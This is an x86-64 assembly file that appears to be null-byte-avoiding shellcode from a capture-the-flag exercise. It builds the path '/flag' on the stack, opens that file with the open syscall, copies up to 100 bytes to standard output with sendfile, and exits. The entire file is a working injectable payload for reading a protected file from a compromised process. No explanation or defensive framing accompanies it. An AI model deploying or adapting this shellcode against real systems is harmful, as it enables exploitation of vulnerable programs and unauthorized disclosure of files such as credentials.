.intel_syntax noprefix
.globl _start

.section .text
_start:
    SHELL_CODE_BEGINNING:
        OPEN_FILE:
            xor rax, rax
            mov al,  2
            xor rdi, rdi
            mov edi, 0x67616c66
            shl rdi, 8
            mov dil, 0x2f
            push rdi
            mov rdi, rsp
            xor rsi, rsi
            syscall

        # Store the fd returned by open().
        xor rcx, rcx
        mov rcx, rax

        SEND_FILE:
            xor rax, rax
            mov al, 40
            xor rdi, rdi
            mov dil, 0x01
            mov rsi, rcx
            xor rdx, rdx
            xor r10, r10
            mov r10b, 0x64
            syscall

        EXIT:
            xor rax, rax
            mov al, 0x3C
            syscall
